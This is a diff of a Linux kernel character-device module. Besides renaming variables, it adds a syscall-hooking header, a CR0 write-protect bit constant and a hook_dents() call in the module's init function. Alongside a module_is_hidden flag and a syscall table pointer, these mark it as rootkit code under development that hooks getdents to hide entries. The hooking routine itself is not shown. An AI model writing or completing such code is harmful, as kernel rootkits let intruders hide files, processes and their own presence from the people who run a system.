@@ -5,6 +5,9 @@
 #include <linux/slab.h>
 #include <linux/fs.h>
 #include <linux/string.h>
+#include <../arch/x86/include/asm/paravirt.h>
+
+#include <hooking.h>
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Seb and Gibble");
@@ -22,14 +25,13 @@ static int nontrivial_close(struct inode *, struct file *);
 static ssize_t nontrivial_write(struct file*, const char *, size_t, loff_t *);
 static ssize_t nontrivial_read(struct file*,  char *, size_t, loff_t *);
 /* global variables */
-static int majorNum;
-static struct class *devClass = NULL;
-static struct device *devStruct = NULL;
+static int major_num;
+static struct class *dev_class = NULL;
+static struct device *dev_struct = NULL;
 int module_is_hidden  = 0;
-
+#define WRITE_PROTECT (1<<16)
 /* syscall variables */
 unsigned long *syscall_table;
-//sys_getdents_t getDents_original = NULL;
 
 static struct file_operations fops = {
 	.read = nontrivial_read,
@@ -40,34 +42,37 @@ static struct file_operations fops = {
 
 /* functions */
 static int __init nontrivial_init(void){
-	majorNum = register_chrdev(0, DEVICE_NAME, &fops);
-	if (majorNum < 0){
+	major_num = register_chrdev(0, DEVICE_NAME, &fops);
+	if (major_num < 0){
 		//Unable to register
 		printk(KERN_ALERT "Failed to register chrdev\n");
-		return majorNum;
+		return major_num;
 	}
-	devClass = class_create(THIS_MODULE, CLASS_NAME);
-	if (IS_ERR(devClass)){
+	dev_class = class_create(THIS_MODULE, CLASS_NAME);
+	if (IS_ERR(dev_class)){
 		//failed to create class, cleanup and return
 		return -1; //need to make this better
 	}
-	devStruct = device_create(devClass, NULL, MKDEV(majorNum, 0), NULL, DEVICE_NAME);
-	if (IS_ERR(devStruct)){
+	dev_struct = device_create(dev_class, NULL, MKDEV(major_num, 0), NULL, DEVICE_NAME);
+	if (IS_ERR(dev_struct)){
 		//failed to create device, cleanup
-		class_destroy(devClass);
-		unregister_chrdev(majorNum, DEVICE_NAME);
+		class_destroy(dev_class);
+		unregister_chrdev(major_num, DEVICE_NAME);
 		printk(KERN_ALERT "Failed to create device\n");
 		return -1; //fix this
 	}
-	// get syscall table
+	if (hook_dents() == -1){
+		printk(KERN_INFO "hook failed :(\n");
+	}
 	printk(KERN_INFO "Successfully registeded module\n");
 	return 0;
 }
 static void __exit nontrivial_exit(void){
-	device_destroy(devClass, MKDEV(majorNum,0));
-	class_unregister(devClass);
-	class_destroy(devClass);
-	unregister_chrdev(majorNum, DEVICE_NAME);
+	device_destroy(dev_class, MKDEV(major_num,0));
+	class_unregister(dev_class);
+	class_destroy(dev_class);
+	unregister_chrdev(major_num, DEVICE_NAME);
+	printk(KERN_INFO "Successful exit\n");
 }
 
 static int nontrivial_open(struct inode *inode, struct file *f){
